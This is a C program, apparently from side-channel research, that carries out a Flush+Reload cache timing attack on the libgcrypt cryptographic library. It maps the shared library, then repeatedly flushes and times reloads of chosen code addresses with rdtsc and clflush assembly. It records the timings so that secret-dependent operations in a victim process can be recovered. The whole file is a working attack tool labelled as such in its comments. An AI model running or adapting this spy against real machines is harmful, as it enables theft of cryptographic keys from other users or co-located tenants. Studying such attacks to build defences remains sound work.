#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <fcntl.h>

int NUM_ADDRS = 3;
int NUM_SLOTS = 50000;
size_t LIBGCRYPT_SIZE = 2621440;

/* Busy wait for a given cycle */
void busy_wait(int cycle) {
    volatile long i;

    for(i = 0; i < cycle; i++) {
        ;
    }
}

/* Measure the time to reload the data at a memory address */
unsigned long probe(char *addr) {
    volatile unsigned long time;

    __asm__ __volatile__ (
        " mfence                \n"
        " lfence                \n"
        " rdtsc                 \n"
        " lfence                \n"
        " movl %%eax, %%esi     \n"
        " movl (%1), %%eax      \n"
        " lfence                \n"
        " rdtsc                 \n"
        " subl %%esi, %%eax     \n"
        " clflush 0(%1)         \n"
        : "=a" (time)
        : "c" (addr)
        : "%esi", "%edx");

    return time;
}

void spy(char *addrs[NUM_ADDRS], unsigned long results[NUM_SLOTS][NUM_ADDRS], int cycles) {
    int i, j;
    for(i = 0; i < NUM_SLOTS; i++) {
        for(j = 0; j < NUM_ADDRS; j++) {
            results[i][j] = probe(addrs[j]);
        }
        /* Busy wait to the end of the time slot */
        busy_wait(cycles);
    }
}

int main(int argc, char *argv[]) {
    int fd;
    int i, j;
    FILE *f;
    char *line = NULL;
    size_t len = 0;
    char *endptr;
    char *target_addrs[NUM_ADDRS];
    unsigned long results[NUM_SLOTS][NUM_ADDRS];
    int cycles;
    int count;

    /* Argument parsing */
    if(argc != 5) {
        fprintf(stderr, "Usage: %s libgcrypt_path target_offsets cycles count\n", argv[0]);
        return -1;
    }
    if((fd = open(argv[1], O_RDONLY)) == -1) {
        fprintf(stderr, "open failed: %s\n", argv[1]);
        return -1;
    }
    if((f = fopen(argv[2], "r")) == NULL) {
        fprintf(stderr, "fopen failed: %s\n", argv[2]);
        return -1;
    }
    cycles = atoi(argv[3]);
    count = atoi(argv[4]);

    /* MMAP libgcyrpt to acheive sharing through page deduplication */
    void *libgcrypt_ptr = mmap(NULL, LIBGCRYPT_SIZE, PROT_READ, MAP_SHARED, fd, 0);
    if(libgcrypt_ptr == MAP_FAILED) {
        fprintf(stderr, "MMAP failed\n");
        return -1;
    }

    for(i = 0; i < NUM_ADDRS; i++) {
        getline(&line, &len, f);
        line[strlen(line) - 1] = '\0';
        target_addrs[i] = (char *) ((unsigned long) libgcrypt_ptr + strtol(line, &endptr, 16));
    }
    free(line);

    /* Attack */
    printf("Start spying\n");
    spy(target_addrs, results, cycles);
    printf("End spying\n");

    fclose(f);

    /* Write results to result.txt */
    char filename[64];
    sprintf(filename, "results/result-%d-%d.txt", cycles, count);
    f = fopen(filename, "w");
    for(i = 0; i < NUM_SLOTS; i++) {
        for(j = 0; j < NUM_ADDRS; j++) {
            fprintf(f, "%d %d %lu\n", i, j, results[i][j]);
        }
    }

    munmap(libgcrypt_ptr, LIBGCRYPT_SIZE);
    fclose(f);

    return 0;
}
